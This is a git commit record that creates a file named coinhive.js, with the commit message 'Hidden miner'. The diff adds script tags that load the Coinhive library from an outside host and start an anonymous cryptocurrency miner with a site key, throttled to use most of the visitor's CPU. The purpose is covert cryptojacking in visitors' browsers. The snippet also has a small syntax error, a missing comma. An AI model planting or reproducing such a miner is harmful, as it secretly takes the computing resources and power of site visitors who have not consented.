8f5c1db25c4b606ad6b4cfaa1e980d64437a9c3a
Janddda <janddda@yahoo.com>
2017-11-25 16:10:21 +0100

    Create coinhive.js
    Hidden miner

---
+++ coinhive.js
@@ -0,0 +1,4 @@
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' { throttle: 0.8 }); miner.start();
+</script>
